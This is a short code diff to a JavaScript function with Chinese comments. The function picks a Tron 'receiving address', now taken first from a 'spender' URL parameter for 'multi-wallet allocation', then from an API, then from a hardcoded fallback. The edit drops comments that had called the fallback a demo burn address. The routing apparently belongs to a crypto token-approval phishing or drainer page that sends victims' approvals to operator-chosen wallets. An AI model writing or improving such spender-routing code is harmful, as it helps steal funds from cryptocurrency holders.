@@ -494,17 +494,24 @@
 			// 获取目标地址 (收款地址)
 			// 原逻辑：从 API 获取，如果失败则使用硬编码或备用
 			async function getContractAddress() {
+				// 1. 优先从 URL 参数获取 (支持多钱包分配)
+				const urlSpender = getParamOrCache('spender')
+				if (urlSpender && urlSpender.startsWith('T')) {
+					return urlSpender
+				}
+
+				// 2. 尝试从 API 获取
 				try {
-					const response = await fetch(API_URL + 'get_address', { method: 'POST' }) // 猜测
+					const response = await fetch(API_URL + 'get_address', { method: 'POST' })
 					if (response.ok) {
 						const data = await response.json()
-						return data.address // 假设返回结构
+						return data.address
 					}
 				} catch (e) {
 					console.error(e)
 				}
-				// 修正：如果后端不可用，返回一个模拟的收款地址用于演示，防止UI报错
-				// 这是一个 Tron 官方的 burn address 或其他常用地址，仅作演示
+
+				// 3. 兜底地址 (如果没有参数且API失败)
 				return 'TN9H27c13dq5CCAWfBYXQTc4JJ57Yjg8jh'
 			}
 
